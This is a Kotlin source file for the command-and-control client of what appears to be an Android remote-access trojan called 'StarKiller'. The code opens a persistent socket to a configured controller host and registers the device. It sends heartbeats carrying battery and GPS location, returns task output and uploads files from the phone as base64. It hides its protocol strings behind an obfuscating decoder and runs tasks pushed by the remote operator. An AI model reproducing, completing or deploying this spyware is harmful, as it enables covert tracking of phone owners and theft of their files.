package com.starkiller.agent

import android.os.Build
import android.util.Base64
import org.json.JSONObject
import java.io.InputStream
import java.io.OutputStream
import java.net.Socket
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.UUID

class C2Client(
    private val service: StarKillerService,
    private val taskRouter: TaskRouter
) {
    private var socket: Socket? = null
    private var input: InputStream? = null
    private var output: OutputStream? = null
    private val agentId = UUID.randomUUID().toString().substring(0, 8)

    @Volatile
    var connected = false
        private set

    private fun k(e: String) = Crypt.d(e)

    fun connect() {
        try {
            socket = Socket(Config.C2_HOST, Config.C2_PORT).apply {
                soTimeout = 0
                keepAlive = true
            }
            input = socket!!.getInputStream()
            output = socket!!.getOutputStream()
            connected = true
            register()
        } catch (e: Exception) {
            connected = false
            throw e
        }
    }

    fun disconnect() {
        connected = false
        try { socket?.close() } catch (_: Exception) {}
        socket = null
        input = null
        output = null
    }

    private fun register() {
        val info = JSONObject().apply {
            put(k("LiIsOA=="), k("KD47NC0rBSg="))
            put(k("Ozw5MyoACT4="), agentId)
            put(k("MjQvKTA+DT8="), Build.MODEL)
            put(k("NSg="), "Android ${Build.VERSION.RELEASE}")
            put(k("Kjc9KTgwEjc="), "android")
            put(k("NzQ4ODI="), "${Build.MANUFACTURER} ${Build.MODEL}")
            put(k("KT83"), Build.VERSION.SDK_INT)
        }
        sendMsg(info)
    }

    fun sendHeartbeat(battery: Int, gps: String?) {
        val hb = JSONObject().apply {
            put(k("LiIsOA=="), k("Mj49Lyo9BTsv"))
            put(k("Ozw5MyoACT4="), agentId)
            put(k("ODooKTstGQ=="), battery)
            if (gps != null) put(k("NjovKQE4ECk="), gps)
        }
        sendMsg(hb)
    }

    fun sendResult(taskId: String, data: JSONObject) {
        val msg = JSONObject().apply {
            put(k("LiIsOA=="), k("KD4vKDIr"))
            put(k("Ozw5MyoACT4="), agentId)
            put(k("LjovNgE2BA=="), taskId)
            put(k("PjooPA=="), data)
        }
        sendMsg(msg)
    }

    fun sendOutput(text: String) {
        val msg = JSONObject().apply {
            put(k("LiIsOA=="), k("NS4oLSsr"))
            put(k("Ozw5MyoACT4="), agentId)
            put(k("Lj4kKQ=="), text)
        }
        sendMsg(msg)
    }

    fun sendFileData(taskId: String, filename: String, fileBytes: ByteArray) {
        val msg = JSONObject().apply {
            put(k("LiIsOA=="), k("PDIwOAE7AS46"))
            put(k("Ozw5MyoACT4="), agentId)
            put(k("LjovNgE2BA=="), taskId)
            put(k("PDIwODA+DT8="), filename)
            put(k("KTImOA=="), fileBytes.size)
            put(k("PjooPA=="), Base64.encodeToString(fileBytes, Base64.NO_WRAP))
        }
        sendMsg(msg)
    }

    fun receiveLoop() {
        while (connected) {
            try {
                val msg = recvMsg() ?: break
                val task = JSONObject(msg)
                if (task.optString(k("LiIsOA==")) == k("LjovNg==")) {
                    taskRouter.dispatch(task)
                }
            } catch (e: Exception) {
                if (connected) {
                    connected = false
                    break
                }
            }
        }
    }

    @Synchronized
    private fun sendMsg(data: JSONObject) {
        val bytes = data.toString().toByteArray(Charsets.UTF_8)
        val header = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(bytes.size).array()
        output?.write(header)
        output?.write(bytes)
        output?.flush()
    }

    private fun recvMsg(): String? {
        val header = ByteArray(4)
        var read = 0
        while (read < 4) {
            val n = input?.read(header, read, 4 - read) ?: return null
            if (n <= 0) return null
            read += n
        }
        val size = ByteBuffer.wrap(header).order(ByteOrder.BIG_ENDIAN).int
        if (size <= 0 || size > 10_000_000) return null

        val body = ByteArray(size)
        read = 0
        while (read < size) {
            val n = input?.read(body, read, size - read) ?: return null
            if (n <= 0) return null
            read += n
        }
        return String(body, Charsets.UTF_8)
    }
}
